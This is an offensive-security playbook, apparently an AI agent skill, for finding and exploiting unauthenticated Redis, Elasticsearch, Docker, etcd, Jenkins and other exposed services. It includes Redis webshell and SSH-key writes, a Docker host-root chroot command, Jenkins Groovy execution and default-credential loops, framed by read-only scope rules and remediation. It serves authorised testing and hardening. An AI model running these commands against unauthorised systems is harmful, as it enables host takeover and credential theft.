---
name: unauthorized-access-common-services
description: >-
  Unauthenticated and misconfigured access to common network services. Use when
  reconnaissance shows exposed datastores, caches, message brokers, registries, or
  admin interfaces — Redis, MongoDB, Elasticsearch, Memcached, RMI/T3/AJP, Docker,
  etcd, Kibana, and the rest of the default-credential and no-auth surface.
---

# SKILL: Unauthorized Access — Common Services

> **AI LOAD INSTRUCTION**: Operational coverage of exposed service access. The class of bug is
> the same everywhere — a service deployed with no authentication, default credentials, or an
> exposed management interface, reachable from a network position the operator should not have.
> This skill catalogs the services, their access paths, their exploitation primitives, and the
> evidence needed. Most tests miss this because they scan ports but never *interact* with the
> protocol.

## 0. RELATED ROUTING

- [network-protocol-attacks](../network-protocol-attacks/SKILL.md) — when the primitives are at the protocol layer, not the service layer
- [tunneling-and-pivoting](../tunneling-and-pivoting/SKILL.md) — when the service is only reachable through a pivot
- [linux-lateral-movement](../linux-lateral-movement/SKILL.md) — when access to the service becomes movement
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — when the service parses Java/Python serialized objects (RMI, T3)
- [cloud-assessment](../cloud-assessment/SKILL.md) — when the datastore is managed cloud infrastructure
- [k8s-postexploit](../k8s-postexploit/SKILL.md) — when the target is a cluster service (etcd, kubelet, API)

---

## 1. WHY THIS CLASS EXISTS

Three recurring deployment failures produce nearly every instance:

| Failure | Mechanism |
|---|---|
| **No auth by default** | the service ships open; the operator was never told to enable auth (Redis, MongoDB pre-3.0, Memcached, Elasticsearch pre-8) |
| **Bind to all interfaces** | intended for localhost only, bound `0.0.0.0` |
| **Default credentials** | vendor default never changed; or credentials in a public image/Helm chart |

**The testing rule:** a port being open is not a finding. The finding is that you *interacted*
with it — read data, wrote data, or executed. Banner-only evidence is always reported as
`PLAUSIBLE`, never `SOLID`.

---

## 2. DATASTORE SURFACE

### 2.1 Redis (6379, 6380 TLS)

```bash
redis-cli -h TARGET ping                    → PONG = no auth
redis-cli -h TARGET info                    → version, role, keyspace
redis-cli -h TARGET config get dir          → where writes land
redis-cli -h TARGET config get dbfilename
redis-cli -h TARGET keys '*'                → enumerate
```

**Primitives:**

| Primitive | Method |
|---|---|
| arbitrary file write | `CONFIG SET dir /var/www/html` + `CONFIG SET dbfilename shell.php` + `SET x "<?php … ?>"` + `SAVE` → webshell |
| SSH key write | `dir /.ssh` + `dbfilename authorized_keys` + `SET x "<pubkey>\n\nPADDING"` |
| cron write | `dir /etc/cron.d` + `dbfilename job` + payload with `\n` |
| module load | `MODULE LOAD /path/to/module.so` → direct RCE (needs a module already on disk or a write path) |
| RCE via replication | `SLAVEOF` to an attacker-controlled rogue Redis → master sends a `.so` → `MODULE LOAD` (RedisModules RCE) |
| Lua sandbox | `EVAL "…" 0` — usually sandboxed, but check the version |

**Note the payload padding:** Redis writes an RDB header before your value. For `authorized_keys`
and cron, prefix with newlines so the header lands on its own invalid line and your entry is
parsed cleanly.

### 2.2 MongoDB (27017, 27018)

```bash
mongosh "mongodb://TARGET:27017" --eval 'db.adminCommand({listDatabases:1})'
mongosh "mongodb://TARGET:27017" --eval 'db.getSiblingDB("admin").system.users.find()'
```

No auth on modern MongoDB is rarer, but: unauthenticated *read* is still common via
misconfigured RBAC, and legacy 2.x accepts anything. Dump collections, then search for
credentials and PII. GridFS (`fs.files` / `fs.chunks`) often holds uploaded artefacts.

**Primitive:** data exfiltration; credential reuse; occasionally a `$where` JS injection for
server-side execution.

### 2.3 Elasticsearch (9200, 9300)

```bash
curl -s TARGET:9200/                                    → cluster info, version
curl -s TARGET:9200/_cat/indices?v                      → all indices
curl -s TARGET:9200/_search?size=100                    → dump everything
curl -s TARGET:9200/_nodes?pretty                        → node config
```

**Primitive:** mass data exposure — ES indexes routinely contain logs, PII, credentials in
log lines, and internal documents with no access control.

**RCE path:** older ES (< 1.4.3 / < 1.5.1) with dynamic scripting — Groovy/MVEL sandbox escape
via `_search` with a script field. Verify the version before attempting; on modern ES scripting
is disabled by default.

### 2.4 Memcached (11211)

```bash
echo -e "stats\r\n" | nc TARGET 11211
echo -e "stats items\r\n" | nc TARGET 11211
echo -e "stats cachedump <slab> 100\r\n" | nc TARGET 11211
```

**Primitive:** session token theft — Memcached frequently holds serialized PHP/Java sessions,
so leaking it can hand you authenticated sessions. Also a reflection source for amplification
attacks, but that is out of scope for a web assessment.

### 2.5 CouchDB (5984)

```bash
curl -s TARGET:5984/_all_dbs
curl -s TARGET:5984/_config           → config incl. admin hash
```

**Primitive:** CVE-2017-12635 (privilege escalation to admin via duplicate-key JSON parsing)
followed by CVE-2017-12636 (query_server RCE — arbitrary command execution via Erlang).
Classic chain; check the version pair.

### 2.6 Cassandra (9042), Neo4j (7474/7687), InfluxDB (8086), Prometheus (9090), Grafana (3000)

| Service | Access | Primitive |
|---|---|---|
| Cassandra | CQL no-auth | keyspace dump |
| Neo4j | `:7474` HTTP, default `neo4j:neo4j` | Cypher arbitrary execution, file read via `LOAD CSV` |
| InfluxDB | `:8086` no-auth (< 1.8) / default creds | metric + often credential dump; `INTO` clause can write files |
| Prometheus | `:9090` open | internal target discovery — reveals the whole internal network map |
| Grafana | `:3000`, default `admin:admin` | datasource SSRF (CVE-2020-11110 class), plugin path traversal → RCE |

**Prometheus is underrated:** an open Prometheus exposes every scrape target, so it is a
recon goldmine that reveals internal hostnames, ports, and service versions from a single HTTP
call. Always enumerate it when present.

---

## 3. JAVA / MIDDLEWARE SURFACE

### 3.1 RMI Registry (1099)

```bash
# list bound names
nmap -sV --script rmi-dumpregistry -p 1099 TARGET
```

An exposed RMI registry with a bound object that deserializes arguments is a direct
deserialization sink → RCE via a gadget chain (CommonsCollections, etc.). Reference the
deserialization skill for chain construction.

### 3.2 T3 / IIOP (7001, 7002 — WebLogic)

T3 deserialization is the classic WebLogic RCE path (CVE-2015-4852 lineage, CVE-2017-3248,
CVE-2018-2628 via JRMP, CVE-2019-2725 `_async`). Test whether T3 handshake is reachable and
whether `weblogic` admin console is on `:7001/console`.

### 3.3 AJP (8009)

```
Ghostcat — CVE-2020-1938
```

AJP `include` attribute can read files inside the webapp (and `WEB-INF/web.xml`), and with an
upload primitive combined it becomes RCE. Modern Tomcat blocked it by default (9.0.31+), so
check the version.

### 3.4 JMX (1099 / 9010)

Unprotected JMX → MBean invocation. `MLet` MBean loads a remote `.mlet`/JAR → RCE. Tools:
`jconsole` for a manual check, `ysoserial` for deserialization through JMX where applicable.

### 3.5 ActiveMQ / RabbitMQ / Kafka / ZooKeeper

| Service | Port | Issue |
|---|---|---|
| ActiveMQ | 61616 | CVE-2015-5254 deserialization; CVE-2023-46604 (OpenWire) RCE |
| RabbitMQ | 5672 / 15672 | default `guest:guest` restricted to localhost in modern versions — test the management UI on `:15672` |
| Kafka | 9092 | no auth → topic list, message read, and often plaintext credentials |
| ZooKeeper | 2181 | no auth → `mntr`, `cons` — and in Kafka/HS deployments it holds broker config and ACLs |

---

## 4. CONTAINER / ORCHESTRATION SURFACE

| Target | Port | Access | Primitive |
|---|---|---|---|
| Docker daemon | 2375 (2376 TLS) | `docker -H tcp://TARGET:2375 ps` | **full host root** — mount `/` and chroot out |
| Docker API | 2375 | `curl TARGET:2375/containers/json` | same |
| etcd | 2379 | `etcdctl --endpoints=TARGET:2379 get / --prefix --keys-only` | K8s secrets in plaintext (service-account tokens, TLS keys) |
| kubelet | 10250 | `/pods`, `/exec` | command execution inside any pod |
| kubelet read-only | 10255 | `/pods`, `/metrics` | pod spec + secret *names* |
| K8s API | 6443 / 8080 | anonymous auth enabled | cluster enumeration, sometimes full control |
| containerd | unix socket via `/run/containerd/containerd.sock` | CRI calls | container escape |

### 4.1 Docker daemon → host root

```bash
docker -H tcp://TARGET:2375 run -v /:/host --privileged -it alpine chroot /host
```

This is a direct, total compromise — the daemon socket is root. Report as CRITICAL with the
`docker ps` output as the proof of access (do not run the chroot step unless the scope allows
proof-of-impact).

### 4.2 etcd → cluster secrets

```
etcdctl --endpoints=http://TARGET:2379 get /registry/secrets --prefix --keys-only
etcdctl --endpoints=http://TARGET:2379 get /registry/secrets/<ns>/<name>
```

Kubernetes stores secrets base64-encoded and unencrypted by default. An open etcd is a full
cluster compromise, not a data leak.

---

## 5. MANAGEMENT INTERFACES

| Service | Default | Note |
|---|---|---|
| Kibana | `:5601`, no auth | index pattern → full ES access; older versions had RCE |
| Tomcat Manager | `/manager/html`, `tomcat:tomcat` | WAR deploy → RCE |
| Jenkins | `:8080`, often no auth | script console → Groovy RCE; `/script` |
| SonarQube | `:9000`, `admin:admin` | default creds; older versions had RCE |
| Zabbix | `:80`, `Admin:zabbix` | default creds; API → script execution on agents |
| RabbitMQ mgmt | `:15672`, `guest:guest` | queue manipulation |
| phpMyAdmin | `/phpmyadmin` | SQL → `INTO OUTFILE` webshell |
| MinIO | `:9000`, `minioadmin:minioadmin` | full object store read/write |
| Consul | `:8500` | service catalog + KV store, often no ACL |
| Vault | `:8200` | `/v1/sys/seal-status` → unsealed? then check for an open token |

**Jenkins `/script` is a complete compromise** and is frequently reachable with no auth on
internal networks. Groovy:
```groovy
println "id".execute().text
```

---

## 6. TESTING METHODOLOGY

```
1. DISCOVER — nmap/service scan over the reachable range
     nmap -sV -p- --open TARGET
     Masscan for wide ranges, then -sV against the hits.

2. CLASSIFY — match each open port to a service family (§2–§5).
     Do not test a port whose protocol you have not confirmed.

3. INTERACT — send the protocol's own liveness command.
     ping / stats / _cat/indices / INFO — a banner is not access.

4. PROVE — perform the smallest action that demonstrates impact.
     Redis: PING + CONFIG GET dir        (not SAVE)
     ES:    _cat/indices                 (not a full dump)
     Docker: ps                           (not run)
     etcd:  keys-only                     (not a secret read)

5. STOP — record the evidence and move on. Do not exfiltrate data to prove a point.

6. CHAIN — an exposed service usually unlocks the next:
     Redis write → webshell → RCE → host
     etcd → SA token → k8s API → cluster
     Prometheus → internal map → next service
```

### Escalation discipline

| Observation | Verdict |
|---|---|
| port open, banner grabbed | `PLAUSIBLE` — not confirmed |
| protocol command succeeded (`PING`, `_cat/indices`) | `SOLID` — unauthenticated access confirmed |
| data read | `SOLID` — record field names only, not values, unless scope permits |
| write / execute achieved | `CRITICAL` — stop, report, do not continue |

---

## 7. EVIDENCE STANDARD

Capture, minimally:

| Item | Example |
|---|---|
| the command issued | `redis-cli -h 10.0.0.5 ping` |
| the raw response | `PONG` |
| the version string | `redis_version:6.0.9` |
| the network position | reachable from the external edge / only via pivot X |
| for data: index/collection/key **names** | not the values |
| the chain, if any | `redis write → /var/www/html/shell.php → RCE as www-data` |

**Never** paste customer data, credentials, or PII into a report. Names and counts prove the
finding; values create a second incident.

---

## 8. REMEDIATION REFERENCE

| Layer | Control |
|---|---|
| network | bind to `127.0.0.1` unless remote access is required; firewall the port to known hosts; never expose datastores to the internet |
| auth | enable native auth (`requirepass`, `--auth`, `xpack.security`); change vendor defaults; use an allowlist of source IPs as a second layer |
| RBAC | least privilege per service account; separate read and write roles; disable anonymous access |
| TLS | enable and require TLS with cert validation; do not accept self-signed silently |
| monitoring | alert on unauthenticated connections; log `CONFIG`, `MODULE`, `SLAVEOF`, and admin API calls |
| config | run containers non-root with read-only roots; never mount the docker socket into a workload; rotate any credential that was reachable |

For Docker specifically: the daemon socket is root-equivalent. There is no partial fix — it
must not be network-reachable, and mounting `/var/run/docker.sock` into a container is a host
compromise waiting to happen.

---

## 9. QUICK PORT REFERENCE

```
6379  Redis          27017 MongoDB        9200  Elasticsearch   11211 Memcached
5984  CouchDB        9042  Cassandra      7474  Neo4j           8086  InfluxDB
9090  Prometheus     3000  Grafana        5601  Kibana          8080  Jenkins
7001  WebLogic T3    8009  AJP            1099  RMI/JMX         61616 ActiveMQ
5672  RabbitMQ       15672 RabbitMQ mgmt  9092  Kafka           2181  ZooKeeper
2375  Docker daemon  2379  etcd           10250 kubelet         10255 kubelet RO
6443  K8s API        9000  MinIO / Sonar  8500  Consul          8200  Vault
```

---

## 10. EXECUTION PRIMITIVES

An unauthenticated-service finding is proven by **a response from the service that contains data or
control it should not expose**. A port being open is a lead; a banner with configuration is a finding.

### 10.1 Sweep the surface and record what answers

```bash
HOST="10.0.0.1"
PORTS="21 22 23 25 111 135 139 443 445 512 513 514 873 1433 1521 2049 2181 2375 2376 3306 3389 \
4369 5000 5432 5601 5672 5900 5984 6379 7001 7199 8000 8080 8081 8443 8888 9000 9042 9090 9200 \
9300 10000 11211 15672 27017 50070 61616"
for P in $PORTS; do
  timeout 2 bash -c "echo > /dev/tcp/$HOST/$P" 2>/dev/null && echo "OPEN $P"
done
# and the version, with a single nmap pass over the open set
nmap -Pn -sV -p$(nmap -Pn -p$PORTS $HOST -oG - | awk '/Ports/{print $0}' | grep -oE '[0-9]+/open' | cut -d/ -f1 | paste -sd,) $HOST
```

**Record the open set and the service versions.** The version determines which of the following blocks
is applicable; a version-specific unattested service is the common case.

### 10.2 Databases: prove access without modifying anything

```bash
# Redis: PING is the non-destructive proof
printf 'PING\r\nINFO server\r\n' | timeout 5 nc $HOST 6379 | head -20
# Memcached: stats exposes the instance and the cached item count
printf 'stats\r\n' | timeout 5 nc $HOST 11211 | head -12
# MongoDB: an unauthenticated listDatabases is the proof
timeout 8 mongosh "mongodb://$HOST:27017" --quiet --eval 'db.adminCommand({listDatabases:1})' 2>&1 | head -20
# Elasticsearch: the cluster health and index list
curl -sS "http://$HOST:9200/_cluster/health?pretty" | head -12
curl -sS "http://$HOST:9200/_cat/indices?v" | head -10
# CouchDB: the database list, and the config which often contains credentials
curl -sS "http://$HOST:5984/_all_dbs"; echo
curl -sS "http://$HOST:5984/_node/_local/_config" | head -c 300; echo
# MySQL / PostgreSQL: a connection attempt reveals whether auth is required
timeout 5 mysql -h $HOST -u root --password= -e 'SELECT VERSION(), USER();' 2>&1 | head -5
PGPASSWORD= timeout 5 psql -h $HOST -U postgres -c 'SELECT version(), current_user;' 2>&1 | head -5
```

**`PING`/`stats`/`listDatabases` are non-destructive and are sufficient.** Do not write, flush, or
delete anything - the proof of unauthenticated access is the response, not the change.

### 10.3 Java and middleware surfaces

```bash
# Tomcat manager and its host-manager, which frequently have default credentials
for P in /manager/html /host-manager/html /manager/status; do
  curl -sS -o /tmp/tc -w "$P %{http_code} %{size_download}\n" "http://$HOST:8080$P"
  grep -oiE 'tomcat|manager|401|role' /tmp/tc | head -2
done
# a default credential check is a single request, and it is within scope to try the documented pair
curl -sS -o /tmp/tca -w 'default-creds %{http_code}\n' -u 'tomcat:tomcat' "http://$HOST:8080/manager/html"
# JBoss / WildFly admin console and the JMX invoker
curl -sS -o /tmp/jb -w 'jboss %{http_code}\n' "http://$HOST:8080/jmx-console/"
curl -sS -o /tmp/wf -w 'wildfly %{http_code}\n' "http://$HOST:9990/console/"
# WebLogic
curl -sS -o /tmp/wl -w 'weblogic %{http_code}\n' "http://$HOST:7001/console/"
# Jenkins, which is a code-execution surface when unauthenticated
curl -sS -o /tmp/jk -w 'jenkins %{http_code}\n' "http://$HOST:8080/script"
grep -oiE 'groovy|script console|Jenkins' /tmp/jk | head -3
```

A `200` on Tomcat's manager, Jenkins' script console, or a JMX console is **remote code execution as a
capability**, and the response body is the proof. Do not execute anything - the reachable console is
the finding.

### 10.4 Container and orchestration surfaces

```bash
# the Docker daemon API, unauthenticated, is root on the host
curl -sS "http://$HOST:2375/version" | head -c 200; echo
curl -sS "http://$HOST:2375/containers/json?all=1" | head -c 300; echo
curl -sS "http://$HOST:2375/info" | python3 -c "import json,sys;d=json.load(sys.stdin);print({k:d.get(k) for k in ('ServerVersion','ContainersRunning','Images','OperatingSystem')})" 2>/dev/null
# kubelet read-only and read-write ports
curl -sS -k "https://$HOST:10250/pods" | head -c 300; echo
curl -sS -k "https://$HOST:10255/pods" | head -c 200; echo
# etcd without client auth exposes every secret
curl -sS "http://$HOST:2379/v2/keys/?recursive=true" | head -c 300; echo
curl -sS "http://$HOST:2379/version" | head -c 120; echo
# a Consul agent in dev mode with no ACLs
curl -sS "http://$HOST:8500/v1/agent/self" | head -c 300
```

**`/containers/json` listing the host's containers, or `/v2/keys` listing secrets, is the finding.**
Never start a container or write an etcd key - the read is the proof and a write is an incident.

### 10.5 Management interfaces and consoles

```bash
# Spring Boot actuators
for P in /actuator /actuator/env /actuator/health /actuator/heapdump /actuator/mappings /actuator/configprops; do
  curl -sS -o /tmp/sb -w "$P %{http_code} %{size_download}\n" "http://$HOST:8080$P"
done
grep -oiE 'spring.datasource.password|password|secret|key' /tmp/sb | sort -u | head -5
# Hadoop and Spark
curl -sS "http://$HOST:50070/dfshealth.html" | head -c 150; echo
curl -sS "http://$HOST:8088/cluster" | head -c 150; echo
# ZooKeeper four-letter words
printf 'stat' | timeout 5 nc $HOST 2181 | head -8
printf 'ruok' | timeout 5 nc $HOST 2181 | head -2
# RabbitMQ management
curl -sS -o /tmp/rq -w 'rabbitmq %{http_code}\n' "http://$HOST:15672/api/overview"; head -c 150 /tmp/rq
```

An actuator `/env` with credentials, or a ZooKeeper `stat` with the cluster state, is the finding.
**`/actuator/heapdump` is a memory disclosure** - download it only if scope permits, and note that it
often contains credentials.

### 10.6 Distinguish exposure from exploitability

```bash
# what can this service actually do, from an unauthenticated position?
echo "--- read";  curl -sS "http://$HOST:9200/_cat/indices?v" | head -3
echo "--- write (do NOT send this; note it as reachable only)"; echo "PUT /newindex would create an index"
echo "--- auth";  curl -sS -o /dev/null -w '%{http_code}\n' "http://$HOST:9200/"
echo "--- version"; curl -sS "http://$HOST:9200/" | head -c 200
# and whether the service is reachable from the internet or only internally
curl -sS -o /dev/null -w 'external %{http_code}\n' --connect-timeout 5 "http://EXTERNAL_IP:9200/"
```

**Report the capability you demonstrated, not the capability the service theoretically has.** A Redis
instance you can `PING` is unauthenticated access; whether you could write a cron job is a separate
claim that requires a demonstration you should not perform.

### 10.7 Default and weak credentials, tried sparingly

```bash
# one documented default pair per service, and only where the engagement permits credential testing
tries() { curl -sS -o /tmp/dc -w '%{http_code}' -u "$1:$2" "$3"; }
for V in 'admin:admin' 'admin:password' 'root:root' 'guest:guest' 'admin:'; do
  U=${V%%:*}; P=${V#*:}
  R=$(tries "$U" "$P" "http://$HOST:15672/api/overview")
  printf '%-20s rabbitmq %s\n' "$V" "$R"
done
# a lockout is possible, so cap the attempts and record them
```

**Cap the attempts and record every one.** Credential testing against a production service can lock out
legitimate users, so it must be explicitly in scope and tightly bounded.

### 10.8 Confirm from an independent vantage point

```bash
# the external vs internal reachability distinction changes severity
for H in "$HOST" "EXTERNAL_IP"; do
  for P in 2375 6379 9200 27017; do
    R=$(curl -sS -o /dev/null -w '%{http_code}' --connect-timeout 4 "http://$H:$P/")
    printf '%-14s :%-6s %s\n' "$H" "$P" "${R:-timeout}"
  done
done
# and confirm the service identity, so the report names the right component
curl -sS -D- -o /dev/null "http://$HOST:9200/" | grep -iE '^server|x-elastic|content-type'
```

**A service reachable only from the internal network has a much lower severity than one on the
internet.** Establish which, from an independent path, before writing the report.

---

## 11. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Does the service respond on the port, with a **banner or protocol response**? | it is running, not merely a filtered port |
| 2 | Did the response contain **data or configuration**, not just a version string? | exposure, as opposed to a fingerprint |
| 3 | Is the response obtainable **without any credential**? | the "unauthorized" part of the class |
| 4 | What is the **capability demonstrated** - read a store, reach a console, list secrets? | impact |
| 5 | Is the service reachable from the **internet or only internally**? | severity, by a large margin |
| 6 | Is the version **patched** for the known issues affecting it? | whether a known escalation exists |
| 7 | Did you avoid any **write, flush, delete, or container start**? | scope discipline; it must be read-only |

**Data in the response, without a credential, is the bar.** A port scan result is a lead; a `_cat/indices`
listing with index names is a finding. State which one you have.

---

## 12. EVIDENCE STANDARD — READ-ONLY PROOF

| Item | Why |
|---|---|
| The **service, version, and port**, with the response that identified it | the component and whether a known issue applies |
| The **request and the response**, with the data or configuration it exposed | the exposure |
| Confirmation the request carried **no credential** | the "unauthorized" claim |
| The **reachability** - internet-facing or internal, established from an independent path | the severity driver |
| The **capability demonstrated** (read, list, console reachable) and nothing beyond | honesty about what was shown |
| **Negative control** - the same request to a closed port or an authenticated service behaves differently | shows the exposure is real |
| For a console: the **console page** and whether it executes code, without executing anything | the capability, safely demonstrated |
| For a store: the **data returned**, with anything sensitive redacted in the report | the impact, without reproducing secrets |
| The **number of credential attempts made**, where any | scope and lockout discipline |
| A statement that **nothing was written, deleted, flushed, or started** | scope discipline |

Report the **service, the response, and the reachability**: "the host exposes Elasticsearch 7.10.2 on
`9200`; an unauthenticated `GET /_cat/indices?v` returned 14 index names including `customers` and
`payments`, and `GET /` returned the version and the cluster name, so authentication is not enabled;
the port is reachable from the internet on the scanned external address; no write operations were
performed and no documents were read beyond the index listing", never "the server has open ports".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| An open port with no response | the service may be filtered or a decoy |
| A version banner only, with no data | a fingerprint, not an exposure |
| A service that requires authentication and returned `401` | the control works |
| A database port that answers but rejects the connection | auth is enforced |
| An interface that is internal-only with a compensating network control | severity is materially different; state it |
| An admin console that requires a credential | not unauthorized |
| A default page from a service that is not actually the expected application | wrong component |
| Proxy-generated content obscuring the service | identify the service before reporting |
| A service you probed outside the agreed scope | scope violation |
| A capability you asserted without demonstrating it (e.g. "RCE is possible") | an inference, not evidence |
| A write you performed to prove write access | an incident |
| A finding on a honeypot or a deliberately exposed decoy | confirm the service's purpose first |

**Read-only proof, and name the component.** Two of the most common errors here are reporting a port
rather than an exposure, and reporting a capability that was never demonstrated.

---

## 13. REMEDIATION REFERENCE — EXPOSURE REDUCTION

1. **Require authentication on every service, with no unauthenticated default** - Redis, Elasticsearch, MongoDB, and the rest all support authentication; disabling it is a configuration decision, and enabling it is the fix.
2. **Bind management and datastore ports to the loopback interface or a management VLAN** - most of these services should never be reachable from an untrusted network, and the binding is the control that matters most.
3. **Firewall at the network layer, with a default-deny inbound policy** - an exposure that is blocked at the perimeter is not an exposure, and this control applies to every service uniformly.
4. **Rotate the credentials that were exposed, and audit for their use** - an exposed store or config file means every credential in it must be treated as compromised, so rotate rather than assess.
5. **Remove default credentials and enforce a strong password policy on every console** - Tomcat, RabbitMQ, Jenkins, and the rest ship with documented defaults, and those are the first attempts an attacker makes.
6. **Do not expose Docker daemon sockets or kubelet APIs without mutual TLS** - unauthenticated access to either is equivalent to root on the host, so mTLS is the minimum bar.
7. **Enable audit logging on every datastore and console, and alert on unauthenticated access** - most of these services log connections, and an anonymous connection to an internal store is high-signal.
8. **Scan continuously for exposed services from both inside and outside the perimeter** - exposure is a configuration drift problem, so the control is a scheduled scan rather than a one-off review.
9. **Restrict the actuator endpoints and never expose heap dumps or environment endpoints** - `/actuator/env` and `/actuator/heapdump` are disclosures of credentials and memory, and they should be bound to an admin port or disabled.
10. **Keep the service versions patched, and track the CVEs affecting each** - unauthenticated exposure of an unpatched service is the highest-probability path to a full compromise.
11. **Apply the same rigour to internal-only services** - the assumption that the internal network is trusted is what makes a single foothold into a full compromise.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [recon-and-methodology](../recon-and-methodology/SKILL.md) - the discovery that surfaces these services
- [cloud-assessment](../cloud-assessment/SKILL.md) - the cloud-side review of exposed services and security groups
- [k8s-assessment](../k8s-assessment/SKILL.md) - the orchestration surface in its assessment form
- [container-escape-techniques](../container-escape-techniques/SKILL.md) - what an exposed container API reaches
- [linux-postexploit](../linux-postexploit/SKILL.md) - the escalation that follows a datastore foothold
